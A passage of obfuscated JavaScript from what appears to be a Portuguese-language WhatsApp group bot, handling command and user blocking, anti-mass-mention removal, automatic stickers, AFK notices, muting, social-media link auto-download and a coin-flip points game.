          var _0xf21f4e = async (_0x3cca6a, _0x56f770) => {
            const _0x213652 = {
              text: _0x56f770
            };
            const _0x2843be = {
              quoted: _0xd2050d
            };
            _0x5196be.sendMessage(_0x3cca6a, _0x213652, _0x2843be);
          };
          const _0x274bc5 = async (_0x14619b, _0x1b4be4, _0x4fb249, _0x2a0dd1, _0x2bc07f, _0x4134bc, _0x1fde4c) => {
            const _0x449a14 = {
              title: _0x4134bc,
              rows: _0x1fde4c
            };
            const _0x59b40e = {
              text: _0x1b4be4,
              footer: _0x4fb249,
              title: _0x2a0dd1,
              buttonText: _0x2bc07f,
              sections: [_0x449a14]
            };
            listMessage = _0x59b40e;
            _0x5196be.sendMessage(_0x14619b, listMessage)["catch"](_0x40ddeb => {
              console.log(_0x40ddeb);
            });
          };
          const _0x6070f7 = JSON.parse(fs.readFileSync("./DADOS/json/comandos2.json"));
          const _0x522350 = _0x215a6d => {
            const _0x1b2f92 = {
              groupId: _0x215a6d,
              comandos: []
            };
            _0x6070f7.push(_0x1b2f92);
            fs.writeFileSync("./DADOS/json/comandos2.json", JSON.stringify(_0x6070f7, null, 2));
          };
          const _0x365896 = _0x1b1181 => {
            let _0xda0206 = false;
            Object.keys(_0x6070f7).forEach(_0xd56464 => {
              if (_0x6070f7[_0xd56464].groupId === _0x1b1181) {
                _0xda0206 = _0xd56464;
              }
            });
            if (_0xda0206 !== false) {
              return _0x6070f7[_0xda0206].groupId;
            }
          };
          const _0x46a105 = (_0x1e18e5, _0x3c5f5e) => {
            let _0x136df6 = false;
            Object.keys(_0x6070f7).forEach(_0x1094ef => {
              if (_0x6070f7[_0x1094ef].groupId === _0x1e18e5) {
                _0x136df6 = _0x1094ef;
              }
            });
            if (_0x136df6 !== false) {
              _0x6070f7[_0x136df6].comandos.push(_0x3c5f5e);
              fs.writeFileSync("./DADOS/json/comandos2.json", JSON.stringify(_0x6070f7, null, 2));
            }
          };
          const _0xc272d = (_0x314364, _0x386bf6) => {
            let _0x5e30c2 = false;
            Object.keys(_0x6070f7).forEach(_0x336e8d => {
              if (_0x6070f7[_0x336e8d].groupId === _0x314364) {
                _0x5e30c2 = _0x336e8d;
              }
            });
            if (_0x5e30c2 !== false) {
              _0x6070f7[_0x5e30c2].comandos.splice(_0x6070f7[_0x5e30c2].comandos.map(_0x198890 => _0x198890.cmd).indexOf(_0x386bf6), 1);
              fs.writeFileSync("./DADOS/json/comandos2.json", JSON.stringify(_0x6070f7, null, 2));
            }
          };
          const _0x4d1fb4 = _0x4f8974 => {
            let _0x254bce = false;
            Object.keys(_0x6070f7).forEach(_0x152fe8 => {
              if (_0x6070f7[_0x152fe8].groupId === _0x4f8974) {
                _0x254bce = _0x152fe8;
              }
            });
            if (_0x254bce !== false) {
              return _0x6070f7[_0x254bce].comandos;
            }
          };
          const _0x44befc = (_0xce782e, _0x519fc8) => {
            let _0x1f938b = false;
            Object.keys(_0x6070f7).forEach(_0xa8c419 => {
              if (_0x6070f7[_0xa8c419].groupId === _0xce782e) {
                _0x1f938b = _0xa8c419;
              }
            });
            if (_0x1f938b !== false) {
              if (_0x6070f7[_0x1f938b].comandos.length > 0) {
                if (Date.now() >= _0x6070f7[_0x1f938b].comandos[_0x6070f7[_0x1f938b].comandos.map(_0x410754 => _0x410754.cmd).indexOf(_0x519fc8)].expired) {
                  _0x6070f7[_0x1f938b].comandos.splice(_0x6070f7[_0x1f938b].comandos.map(_0x355fad => _0x355fad.cmd).indexOf(_0x519fc8), 1);
                  fs.writeFileSync("./DADOS/json/comandos2.json", JSON.stringify(_0x6070f7, null, 2));
                }
              }
            }
          };
          if (_0x89cd51) {
            checar = _0x365896(_0x346d97);
            if (checar === undefined) {
              _0x522350(_0x346d97);
            }
          }
          if (_0x89cd51 && _0x1d6d9e && _0x4d1fb4(_0x346d97).map(_0x377721 => _0x377721.cmd).includes(_0x267d4b)) {
            _0x44befc(_0x346d97, _0x267d4b);
          }
          if (_0x89cd51 && _0x1d6d9e && _0x4d1fb4(_0x346d97).map(_0x54d205 => _0x54d205.cmd).includes(_0x267d4b)) {
            k = "╭───「 ❔ Suporte 🤓 」\n│\n├ Olá *" + _0x671b4b + "*\n├ O comando *" + _0x267d4b + "* está\n├ bloqueado no momento\n│\n╰───────────────────";
            return _0x50740b(k);
          }
          const _0x55b762 = JSON.parse(fs.readFileSync("./DADOS/json/adv2.json"));
          const _0x3fc793 = _0x5691fc => {
            const _0x25cc5b = {
              groupId: _0x5691fc,
              users: []
            };
            _0x55b762.push(_0x25cc5b);
            fs.writeFileSync("./DADOS/json/adv2.json", JSON.stringify(_0x55b762, null, 2));
          };
          const _0x490627 = _0x184145 => {
            let _0xd03ce8 = false;
            Object.keys(_0x55b762).forEach(_0x3b59c7 => {
              if (_0x55b762[_0x3b59c7].groupId === _0x184145) {
                _0xd03ce8 = _0x3b59c7;
              }
            });
            if (_0xd03ce8 !== false) {
              return _0x55b762[_0xd03ce8].groupId;
            }
          };
          const _0x240d86 = (_0x28772d, _0x2f23bf) => {
            let _0x486189 = false;
            Object.keys(_0x55b762).forEach(_0x299a77 => {
              if (_0x55b762[_0x299a77].groupId === _0x28772d) {
                _0x486189 = _0x299a77;
              }
            });
            if (_0x486189 !== false) {
              _0x55b762[_0x486189].users.push(_0x2f23bf);
              fs.writeFileSync("./DADOS/json/adv2.json", JSON.stringify(_0x55b762, null, 2));
            }
          };
          const _0x29b6e0 = (_0x222410, _0x417577) => {
            let _0x214521 = false;
            Object.keys(_0x55b762).forEach(_0x21e1d9 => {
              if (_0x55b762[_0x21e1d9].groupId === _0x222410) {
                _0x214521 = _0x21e1d9;
              }
            });
            if (_0x214521 !== false) {
              _0x55b762[_0x214521].users.splice(_0x55b762[_0x214521].users.map(_0x4723ad => _0x4723ad.userId).indexOf(_0x417577), 1);
              fs.writeFileSync("./DADOS/json/adv2.json", JSON.stringify(_0x55b762, null, 2));
            }
          };
          const _0x2c6390 = _0x4c6cad => {
            let _0x27a2db = false;
            Object.keys(_0x55b762).forEach(_0x2390cc => {
              if (_0x55b762[_0x2390cc].groupId === _0x4c6cad) {
                _0x27a2db = _0x2390cc;
              }
            });
            if (_0x27a2db !== false) {
              return _0x55b762[_0x27a2db].users;
            }
          };
          const _0x2b39e3 = (_0x355317, _0x36337b) => {
            let _0x12292a = false;
            Object.keys(_0x55b762).forEach(_0x56de53 => {
              if (_0x55b762[_0x56de53].groupId === _0x355317) {
                _0x12292a = _0x56de53;
              }
            });
            if (_0x12292a !== false) {
              if (_0x55b762[_0x12292a].users.length > 0) {
                if (Date.now() >= _0x55b762[_0x12292a].users[_0x55b762[_0x12292a].users.map(_0x588e62 => _0x588e62.userId).indexOf(_0x36337b)].expired) {
                  _0x55b762[_0x12292a].users.splice(_0x55b762[_0x12292a].users.map(_0x1edde3 => _0x1edde3.userId).indexOf(_0x36337b), 1);
                  fs.writeFileSync("./DADOS/json/adv2.json", JSON.stringify(_0x55b762, null, 2));
                }
              }
            }
          };
          if (_0x89cd51) {
            checar = _0x490627(_0x346d97);
            if (checar === undefined) {
              _0x3fc793(_0x346d97);
            }
          }
          if (_0x89cd51 && _0x1d6d9e && _0x2c6390(_0x346d97).map(_0x5c18a9 => _0x5c18a9.userId).includes(_0x246d48)) {
            _0x2b39e3(_0x346d97, _0x246d48);
          }
          if (_0x89cd51 && _0x1d6d9e && _0x2c6390(_0x346d97).map(_0x2dd95f => _0x2dd95f.userId).includes(_0x246d48)) {
            k = "╭───「 ❔ Suporte 🤓 」\n│\n├ Olá *" + _0x671b4b + "*\n├ Você está\n├ bloqueado no momento\n│\n╰───────────────────";
            return _0x50740b(k);
          }
          const _0x56ed9d = legendafig.FigAuthor.replaceAll("#Nome#", _0x671b4b).replaceAll("#NomeDoGp#", _0x3baffe).replaceAll("#NomeDoBot#", NomeDoBot).replaceAll("#Dono#", NickDono).slice(0, 200);
          const _0x4ecbb6 = legendafig.FigPack.replaceAll("#Nome#", _0x671b4b).replaceAll("#NomeDoGp#", _0x3baffe).replaceAll("#NomeDoBot#", NomeDoBot).replaceAll("#Dono#", NickDono).slice(0, 200);
          if (_0x16ba85) {
            if (_0x89cd51 && _0x42a9f2 && !_0x3f2f63 && !_0xf59944 && !_0xd2050d.key.fromMe) {
              if (_0xd79836?.["length"] >= groupMembers.length - 1) {
                const _0x2177be = {
                  text: "Membro comum com mensagem de marcação de todos do grupo, por conta disso irei remover do grupo, qualquer coisa entre em contato com um administrador..."
                };
                _0x5196be.sendMessage(_0x346d97, _0x2177be);
                if (_0x1b869d) {
                  setTimeout(() => {
                    _0x5196be.sendMessage(_0x346d97, {
                      'delete': {
                        'remoteJid': _0x346d97,
                        'fromMe': false,
                        'id': _0xd2050d.key.id,
                        'participant': _0x246d48
                      }
                    });
                  }, 500);
                }
                _0x5196be.groupParticipantsUpdate(_0x346d97, [_0x246d48], "remove");
              }
            }
          }
          if (_0x29ccfb && _0x89cd51) {
            async function _0x29fc28() {
              setTimeout(async () => {
                if (_0x3a0a2c.includes(_0x141936 + "sticker") || _0x3a0a2c.includes(_0x141936 + 's') || _0x3a0a2c.includes(_0x141936 + "stk") || _0x3a0a2c.includes(_0x141936 + 'st') || _0x3a0a2c.includes(_0x141936 + "fsticker") || _0x3a0a2c.includes(_0x141936 + 'f') || _0x3a0a2c.includes(_0x141936 + "fstiker")) {
                  return;
                }
                if (_0x4c3ee0 == "imageMessage") {
                  owgi = await getFileBuffer(_0xd2050d.message.imageMessage, "image");
                  const _0x276249 = {
                    packname: _0x4ecbb6,
                    author: _0x56ed9d
                  };
                  let _0x5e58a5 = await sendImageAsSticker2(_0x5196be, _0x346d97, owgi, _0xd2050d, _0x276249);
                  DLT_FL(_0x5e58a5);
                }
                if (_0x4c3ee0 == "videoMessage") {
                  if (_0x39e519 && _0xd2050d.message.videoMessage.seconds < 10) {
                    owgi = await getFileBuffer(_0xd2050d.message.videoMessage, "video");
                    const _0x754abc = {
                      packname: _0x4ecbb6,
                      author: _0x56ed9d
                    };
                    let _0x2e8976 = await sendVideoAsSticker2(_0x5196be, _0x346d97, owgi, _0xd2050d, _0x754abc);
                    DLT_FL(_0x2e8976);
                  }
                }
              }, 1000);
            }
            _0x29fc28()["catch"](_0x560e16 => {
              console.log(_0x560e16);
            });
          }
          const _0x4b73b0 = JSON.parse(fs.readFileSync("./DADOS/json/pushname.json"));
          if (_0x4b73b0[_0x246d48] !== _0x671b4b) {
            _0x4b73b0[_0x246d48] = _0x671b4b;
            fs.writeFileSync("./DADOS/json/pushname.json", JSON.stringify(_0x4b73b0, null, 2));
          }
          var _0x490c9c = setting.numerodono.replace(new RegExp("[()+-/ +/]", 'gi'), '');
          if (_0x89cd51 && fs.existsSync("./DADOS/json/afk-@" + _0x490c9c + ".json")) {
            if (_0x3a0a2c.indexOf('@' + _0x490c9c) >= 0) {
              let _0x2ed53c = JSON.parse(fs.readFileSync("./DADOS/json/afk-@" + _0x490c9c + ".json"));
              txt = "- Olá, o " + NickDono + " Está ausente.\n\n - Desde: " + _0x2ed53c.Ausente_Desde + "\n\n- 😇 Mensagem de ausência : " + _0x2ed53c.Motivo_Da_Ausência;
              const _0x27c278 = {
                text: txt
              };
              const _0x13493e = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, _0x27c278, _0x13493e);
            }
          }
          if (_0x89cd51 && _0x326cbd[0].ausentes?.["length"] > 0 && _0xd79836?.["length"] > 0 && JSON.stringify(_0x326cbd[0].ausentes).includes(_0xd79836)) {
            _0x37575f = [];
            for (_0x3194f3 of _0xd79836) {
              if (_0x1c25a7.indexOf(String(_0x3194f3)) != -1) {
                _0x37575f.push(_0x1c25a7.indexOf(String(_0x3194f3)));
              }
            }
            if (_0x37575f.length == 0) {
              return;
            }
            big = [];
            for (_0x3194f3 of _0x37575f) {
              big.push(_0x1c25a7[_0x3194f3]);
            }
            blr = [];
            for (_0x3194f3 = 0; _0x3194f3 < big.length; _0x3194f3++) {
              blr.push(_0x326cbd[0].ausentes[_0x326cbd[0].ausentes.map(_0x2bc750 => _0x2bc750.id).indexOf(big[_0x3194f3])]);
            }
            for (_0x3194f3 of blr) {
              var _0x21476b = _0x3194f3;
            }
            _0x5dcc57("\n╭─────────────\n┊ Registro de ausência.\n┊ \n┊ ADM: @" + _0x21476b.id.split('@')[0] + "\n┊   \n╰────◉  ◊\n\n↺➤ Mensagem: " + _0x21476b.msg + "\n\n ─────────────");
          }
          if (_0x42a9f2 && _0x3f2f63 && _0x3ac611 === "apaga") {
            if (!_0x42d32c) {
              return;
            }
            _0x5196be.sendMessage(_0x346d97, {
              'delete': {
                'remoteJid': _0x346d97,
                'fromMe': false,
                'id': _0xd2050d.message.extendedTextMessage.contextInfo.stanzaId,
                'participant': _0x42d32c
              }
            });
          }
          const _0x5e0183 = require("node-webpmux");
          async function _0x28fff4(_0x4c495e) {
            const _0x3ecdc5 = Math.floor(Math.random() * 10000) + ".webp";
            const _0x307a6f = Math.floor(Math.random() * 10000) + ".jpg";
            fs.writeFileSync(_0x307a6f, _0x4c495e);
            await new Promise((_0x50df30, _0x429b37) => {
              ffmpeg(_0x307a6f).on("end", () => _0x50df30(true)).addOutputOptions(["-vcodec", "libwebp", "-vf", "scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-5:-5:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse"]).toFormat("webp").save(_0x3ecdc5);
            });
            const _0x6e0e30 = fs.readFileSync(_0x3ecdc5);
            fs.unlinkSync(_0x3ecdc5);
            fs.unlinkSync(_0x307a6f);
            return _0x6e0e30;
          }
          async function _0x34a8ba(_0x34b91d) {
            const _0x7fd7ed = Math.floor(Math.random() * 10000) + ".webp";
            const _0x3bae35 = Math.floor(Math.random() * 10000) + ".mp4";
            fs.writeFileSync(_0x3bae35, _0x34b91d);
            await new Promise((_0x40c2ed, _0x2485d8) => {
              ffmpeg(_0x3bae35).on("end", () => _0x40c2ed(true)).addOutputOptions(["-vcodec", "libwebp", "-vf", "scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse", "-loop", '0', "-ss", "00:00:00", '-t', "00:00:05", "-preset", "default", "-an", "-vsync", '0']).toFormat("webp").save(_0x7fd7ed);
            });
            const _0x204576 = fs.readFileSync(_0x7fd7ed);
            fs.unlinkSync(_0x7fd7ed);
            fs.unlinkSync(_0x3bae35);
            return _0x204576;
          }
          async function _0x1ca39b(_0x197976, _0x46e0f1) {
            let _0x320986 = await _0x28fff4(_0x197976);
            const _0x2d0ef6 = Math.floor(Math.random() * 10000) + ".webp";
            const _0x5f5053 = Math.floor(Math.random() * 10000) + ".webp";
            fs.writeFileSync(_0x5f5053, _0x320986);
            if (_0x46e0f1.packname || _0x46e0f1.author) {
              const _0x38c2dc = new _0x5e0183.Image();
              const _0x260c11 = {
                "sticker-pack-id": "@Kauan_dev",
                "sticker-pack-name": _0x46e0f1.packname,
                "sticker-pack-publisher": _0x46e0f1.author,
                emojis: _0x46e0f1.categories ? _0x46e0f1.categories : ['']
              };
              const _0x377b9c = Buffer.from([73, 73, 42, 0, 8, 0, 0, 0, 1, 0, 65, 87, 7, 0, 0, 0, 0, 0, 22, 0, 0, 0]);
              const _0x445d4f = Buffer.from(JSON.stringify(_0x260c11), "utf-8");
              const _0x3a3950 = Buffer.concat([_0x377b9c, _0x445d4f]);
              _0x3a3950.writeUIntLE(_0x445d4f.length, 14, 4);
              await _0x38c2dc.load(_0x5f5053);
              fs.unlinkSync(_0x5f5053);
              _0x38c2dc.exif = _0x3a3950;
              await _0x38c2dc.save(_0x2d0ef6);
              return _0x2d0ef6;
            }
          }
          async function _0x26d04a(_0xce4695, _0x12ca3) {
            let _0x5137fc = await _0x34a8ba(_0xce4695);
            const _0x1365bf = Math.floor(Math.random() * 10000) + ".webp";
            const _0x124f6a = Math.floor(Math.random() * 10000) + ".webp";
            fs.writeFileSync(_0x124f6a, _0x5137fc);
            if (_0x12ca3.packname || _0x12ca3.author) {
              const _0x254389 = new _0x5e0183.Image();
              const _0xcf0bb7 = {
                "sticker-pack-id": "com.marsvard.stickermakerforwhatsapp.stickercontentprovider 1594741845",
                "sticker-pack-name": _0x12ca3.packname,
                "sticker-pack-publisher": _0x12ca3.author,
                "android-app-store-link": "https://play.google.com/store/apps/details?id=com.marsvard.stickermakerforwhatsapp&referrer=utm_source%3Dopenwa%26utm_medium%3Dstickerapi%26utm_term%3D6247",
                "ios-app-store-link": "https://itunes.apple.com/app/sticker-maker-studio/id1443326857"
              };
              const _0x123ec5 = Buffer.from([73, 73, 42, 0, 8, 0, 0, 0, 1, 0, 65, 87, 7, 0, 0, 0, 0, 0, 22, 0, 0, 0]);
              const _0x5a1fe7 = Buffer.from(JSON.stringify(_0xcf0bb7), "utf-8");
              const _0x587fc3 = Buffer.concat([_0x123ec5, _0x5a1fe7]);
              _0x587fc3.writeUIntLE(_0x5a1fe7.length, 14, 4);
              await _0x254389.load(_0x124f6a);
              fs.unlinkSync(_0x124f6a);
              _0x254389.exif = _0x587fc3;
              await _0x254389.save(_0x1365bf);
              return _0x1365bf;
            }
          }
          async function _0x2b61d2(_0x2eb652, _0x448cf9) {
            let _0x234893 = /webp/.test(_0x2eb652.mimetype) ? _0x2eb652.data : /image/.test(_0x2eb652.mimetype) ? await _0x28fff4(_0x2eb652.data) : /video/.test(_0x2eb652.mimetype) ? await _0x34a8ba(_0x2eb652.data) : '';
            const _0x572907 = Math.floor(Math.random() * 10000) + ".webp";
            const _0x4513cc = Math.floor(Math.random() * 10000) + ".webp";
            fs.writeFileSync(_0x4513cc, _0x234893);
            if (_0x448cf9.packname || _0x448cf9.author) {
              const _0xc3b171 = new _0x5e0183.Image();
              const _0x49ed11 = {
                "sticker-pack-id": "com.marsvard.stickermakerforwhatsapp.stickercontentprovider 1594741845",
                "sticker-pack-name": _0x448cf9.packname,
                "sticker-pack-publisher": _0x448cf9.author,
                "android-app-store-link": "https://play.google.com/store/apps/details?id=com.marsvard.stickermakerforwhatsapp&referrer=utm_source%3Dopenwa%26utm_medium%3Dstickerapi%26utm_term%3D6247",
                "ios-app-store-link": "https://itunes.apple.com/app/sticker-maker-studio/id1443326857"
              };
              const _0x1fb392 = Buffer.from([73, 73, 42, 0, 8, 0, 0, 0, 1, 0, 65, 87, 7, 0, 0, 0, 0, 0, 22, 0, 0, 0]);
              const _0x2b1851 = Buffer.from(JSON.stringify(_0x49ed11), "utf-8");
              const _0x119a8a = Buffer.concat([_0x1fb392, _0x2b1851]);
              _0x119a8a.writeUIntLE(_0x2b1851.length, 14, 4);
              await _0xc3b171.load(_0x4513cc);
              fs.unlinkSync(_0x4513cc);
              _0xc3b171.exif = _0x119a8a;
              await _0xc3b171.save(_0x572907);
              return _0x572907;
            }
          }
          const _0x1c61fa = JSON.parse(fs.readFileSync("./DADOS/json/mutados.json"));
          const _0x45700b = _0x89cd51 && _0x1c61fa.some(_0x1f9e9f => _0x1f9e9f.grupo === _0x346d97);
          const _0x1e2d38 = _0x45700b ? _0x1c61fa.find(_0x3021ea => _0x3021ea.grupo === _0x346d97).numeros : [];
          if (_0x89cd51 && _0x42a9f2 && _0x45700b && _0x1e2d38.includes(_0x246d48)) {
            setTimeout(async () => {
              _0x5196be.sendMessage(_0x346d97, {
                'delete': {
                  'remoteJid': _0x346d97,
                  'fromMe': false,
                  'id': _0xd2050d.key.id,
                  'participant': _0x246d48
                }
              });
            }, 1000);
            return;
          }
          const _0x4b25e4 = (_0x217a44, _0x2523a1, _0x37c016) => {
            const _0x4113ce = {
              "true": true,
              txt: "Este comando só deve ser utilizado em Grupos."
            };
            if (_0x217a44 && !_0x89cd51) {
              return _0x4113ce;
            }
            const _0x793ca6 = {
              "true": true,
              txt: "Só Administradores do grupo podem utilizar este comando.."
            };
            if (_0x2523a1 && !_0x3f2f63) {
              return _0x793ca6;
            }
            const _0x4417cd = {
              "true": true,
              txt: "O Bot precisa ser Administrador do grupo para utilizar este comando..."
            };
            if (_0x37c016 && !_0x42a9f2) {
              return _0x4417cd;
            }
            const _0x10e2bb = {
              "true": false
            };
            return _0x10e2bb;
          };
          async function _0x705792() {
            if (!_0xd2050d.message?.["reactionMessage"] || !_0x89cd51) {
              return;
            }
            let {
              remoteJid: _0x4e81d5,
              participant: _0x15da20
            } = _0xd2050d.key;
            let _0x28834c = _0xd2050d.message.reactionMessage.key.id;
            let _0x20c075;
            try {
              _0x20c075 = JSON.parse(fs.readFileSync("./DADOS/json/sortreact.json", "utf8"));
            } catch (_0x62c986) {
              console.warn("Não foi possível ler o arquivo existente: " + _0x62c986.message);
              return;
            }
            let _0x1c775a = _0x20c075.grupos[_0x4e81d5];
            if (_0x1c775a && _0x1c775a.idMensagem === _0x28834c && !_0x1c775a.participantes.includes(_0x15da20)) {
              _0x1c775a.participantes.push(_0x15da20);
              try {
                fs.writeFileSync("./DADOS/json/sortreact.json", JSON.stringify(_0x20c075, null, 2));
              } catch (_0x3753a6) {
                console.error("Erro ao escrever no arquivo: " + _0x3753a6.message);
              }
            }
            _0x20c075 = null;
          }
          _0x705792();
          if (_0x89cd51 && _0x326cbd[0]?.["autobaixar"]) {
            function _0xce2866(_0x43fee5) {
              let _0x35f10a = /(https?:\/\/[^\s]+)/;
              let _0x51c600 = _0x43fee5.match(_0x35f10a);
              return _0x51c600 ? _0x51c600[0] : null;
            }
            let _0x10ed2a = _0xd2050d.message?.["extendedTextMessage"]?.["text"] ? _0xd2050d.message?.["extendedTextMessage"]?.["text"] : _0xd2050d.message.conversation;
            let _0x2b49cb = _0xce2866(_0x10ed2a);
            var _0x13ddb8 = _0x2b49cb ? _0x2b49cb.includes("instagram.com/") && _0x2b49cb.length > 30 ? "instagram" : _0x2b49cb.includes("tiktok.com/") && _0x2b49cb.length > 30 ? "tiktok" : (_0x2b49cb.includes("https://twitter.com/") || _0x2b49cb.includes("https://x.com/")) && _0x2b49cb.length > 30 ? "twitter" : _0x2b49cb.includes("https://www.facebook.com/") || _0x2b49cb.includes("https://fb.watch/") ? "facebook" : _0x2b49cb.includes("spotify.com/") && _0x2b49cb.length > 30 ? "spotify" : _0x2b49cb.includes("kwai.com/") && _0x2b49cb.length > 25 ? "kwai" : _0x2b49cb.includes("https://youtube.com/shorts/") && _0x2b49cb.length > 25 ? "shorts" : false : false;
            switch (_0x13ddb8) {
              case "spotify":
                {
                  _0x50740b(_0x50f430);
                  try {
                    _0x5196be.sendMessage(_0x346d97, {
                      'audio': {
                        'url': reqapi.spotify_mp3(_0x2b49cb)
                      },
                      'mimetype': "audio/mpeg",
                      'mentions': [_0x246d48]
                    })["catch"](async _0x5ef98b => {
                      return;
                    });
                  } catch (_0x1fd17e) {
                    return;
                  }
                }
                break;
              case "instagram":
                try {
                  _0x50740b(_0x50f430);
                  let _0x22f77f = await reqapi.instagram(_0x2b49cb);
                  let _0x51a452 = _0x22f77f.msg[0].type;
                  var _0x1d302 = _0x51a452 === "mp4" ? "video/mp4" : _0x51a452 === "webp" ? "image/webp" : _0x51a452 === "jpg" ? "image/jpeg" : _0x51a452 === "mp3" ? "audio/mpeg" : "video/mp4";
                  const _0x2c4d1b = {
                    url: _0x22f77f.msg[0].url
                  };
                  const _0x5f301c = {
                    url: _0x22f77f.msg[0].url
                  };
                  var _0x8957a3 = _0x1d302.split('/')[0] === "image" ? {
                    'image': _0x2c4d1b,
                    'mimetype': _0x1d302,
                    'mentions': [_0x246d48]
                  } : {
                    'video': _0x5f301c,
                    'mimetype': _0x1d302,
                    'mentions': [_0x246d48]
                  };
                  _0x5196be.sendMessage(_0x346d97, _0x8957a3)["catch"](_0x87f4b6 => {
                    return;
                  });
                } catch (_0x50ab5a) {
                  return;
                }
                break;
              case "tiktok":
              case "twitter":
              case "facebook":
              case "kwai":
              case "shorts":
                {
                  try {
                    _0x50740b(_0x50f430);
                    _0x5196be.sendMessage(_0x346d97, {
                      'video': {
                        'url': _0x13ddb8 === "tiktok" ? reqapi.tiktok(_0x2b49cb) : _0x13ddb8 === "twitter" ? reqapi.twitter(_0x2b49cb, false) : _0x13ddb8 === "kwai" ? reqapi.kwai_mp4(_0x2b49cb) : _0x13ddb8 === "shorts" ? reqapi.play(_0x2b49cb, false) : reqapi.facebook(_0x2b49cb, false)
                      },
                      'mimetype': "video/mp4",
                      'mentions': [_0x246d48]
                    })["catch"](_0x516862 => {
                      return;
                    });
                  } catch (_0x4b7da5) {
                    return;
                  }
                }
                break;
              default:
            }
          }
          function _0x10b978() {
            if (fs.existsSync("./DADOS/json/ccgold.json")) {
              return JSON.parse(fs.readFileSync("./DADOS/json/ccgold.json"));
            }
            return {};
          }
          function _0x245ba2(_0x2aebe3) {
            fs.writeFileSync("./DADOS/json/ccgold.json", JSON.stringify(_0x2aebe3, null, 2));
          }
          let _0x1843d8 = _0x10b978();
          if (_0x1843d8[_0x346d97]) {
            if (_0x1843d8[_0x346d97].userX == _0x246d48) {
              if (_0x1843d8[_0x346d97].accept) {
                switch (_0x3ac611.toLowerCase()) {
                  case "cara":
                  case "coroa":
                    {
                      _0x1843d8[_0x346d97].userXChoice = _0x3ac611.toLowerCase();
                      await _0x5196be.sendMessage(_0x346d97, {
                        'text': '@' + _0x1843d8[_0x346d97].userX.split('@')[0] + " escolheu " + _0x3ac611.toLowerCase() + ", aguarde enquanto sorteamos...",
                        'mentions': [_0x1843d8[_0x346d97].userX]
                      });
                      await delay(5000);
                      let _0x29365a = ["cara", "coroa"];
                      let _0x10b6ac = _0x29365a[Math.floor(Math.random() * _0x29365a.length)];
                      let _0x12005d;
                      let _0x35a015;
                      if (_0x1843d8[_0x346d97].userXChoice === _0x10b6ac) {
                        _0x12005d = _0x1843d8[_0x346d97].userX;
                        _0x35a015 = _0x1843d8[_0x346d97].userY;
                      } else {
                        _0x12005d = _0x1843d8[_0x346d97].userY;
                        _0x35a015 = _0x1843d8[_0x346d97].userX;
                      }
                      _0x3de59a.RM(_0x35a015, 50);
                      _0x3de59a.ADD(_0x12005d, 50);
                      await _0x5196be.sendMessage(_0x346d97, {
                        'text': "Deu " + _0x10b6ac + ", Parabéns @" + _0x12005d.split('@')[0] + ", você venceu o desafio e ganhou 50 golds!",
                        'mentions': [_0x12005d]
                      });
                      delete _0x1843d8[_0x346d97];
                      _0x245ba2(_0x1843d8);
                    }
                    break;
                  default:
                }
              } else {
                switch (_0x3ac611.toLowerCase()) {
                  case "aceitar":
                  case "aceito":
                  case "sim":
                  case 's':
                    let _0x31e09b = _0xd2050d.messageTimestamp;
                    _0x1843d8[_0x346d97].accept = true;
                    _0x1843d8[_0x346d97].time = _0x31e09b;
                    _0x245ba2(_0x1843d8);
                    _0x50740b("Digite o lado que você deseja, *CARA* Ou *COROA*");
                    setTimeout(() => {
                      let _0xc81814 = _0x10b978();
                      if (_0xc81814[_0x346d97] && _0xc81814[_0x346d97].time == _0x31e09b && _0xc81814[_0x346d97].accept) {
                        delete _0xc81814[_0x346d97];
                        _0x245ba2(_0xc81814);
                        _0x50740b("Jogo resetado devido a inatividade!");
                      }
                    }, 30000);
                    break;
                  case "recusar":
                    _0x5dcc57('@' + _0x1843d8[_0x346d97].userY.split('@')[0] + ", seu pedido foi rejeitado!");
                    delete _0x1843d8[_0x346d97];
                    _0x245ba2(_0x1843d8);
                    break;
                  default:
                }
              }
            }
          }
          function _0x261700(_0x2a6179, _0x585e01) {
            let _0x22a9a1 = 0;
            let _0x125ea0 = '';
            _0x585e01.forEach(_0x59d3c7 => {
              let _0xf34789 = 0;
              let _0x8979f2 = _0x2a6179.toLowerCase();
              let _0x31f76c = _0x59d3c7.toLowerCase();
              if (_0x8979f2.length < _0x31f76c.length) {
                return;
              }
              for (let _0x3620a5 = 0; _0x3620a5 < _0x31f76c.length; _0x3620a5++) {
                if (_0x8979f2[_0x3620a5] === _0x31f76c[_0x3620a5]) {
                  _0xf34789++;
                }
              }
              let _0xfa7853 = _0xf34789 / _0x31f76c.length;
              if (_0xfa7853 > _0x22a9a1) {
                _0x22a9a1 = _0xfa7853;
                _0x125ea0 = _0x59d3c7;
              }
            });
            let _0x144232 = Math.round(_0x22a9a1 * 100);
            const _0x27deca = {
              simil: _0x125ea0,
              similpocent: _0x144232
            };
            return _0x27deca;
          }
          async function _0x1dcb6b(_0x572cc9) {
            return new Promise((_0x53d5b2, _0x211031) => {});
          }
          async function _0x5a1278(_0x54dfc2, _0x220f6b) {
            try {
              let _0x568f60 = [];
              for (let _0x4df4be of _0x220f6b) {
                const _0x2a8d19 = {
                  url: _0x4df4be.url
                };
                const _0x4c1aae = {
                  image: _0x2a8d19
                };
                const _0x1b91ec = {
                  upload: _0x5196be.waUploadToServer
                };
                let _0x12daa4 = await prepareWAMessageMedia(_0x4c1aae, _0x1b91ec);
                const _0x155eb1 = {
                  hasMediaAttachment: true,
                  imageMessage: _0x12daa4.imageMessage
                };
                const _0x586fb8 = {
                  text: _0x4df4be.text
                };
                const _0x125aa9 = {
                  buttons: _0x4df4be.buttons || []
                };
                const _0x5574de = {
                  header: _0x155eb1,
                  headerType: "IMAGE",
                  body: _0x586fb8,
                  nativeFlowMessage: _0x125aa9
                };
                _0x568f60.push(_0x5574de);
              }
              const _0x380610 = {
                cards: _0x568f60
              };
              const _0x6b174d = {
                carouselMessage: _0x380610
              };
              const _0x34f964 = {
                interactiveMessage: _0x6b174d
              };
              await _0x5196be.relayMessage(_0x54dfc2, _0x34f964, {});
            } catch (_0x4b0a5c) {
              _0x50740b(_0x4b0a5c);
            }
          }
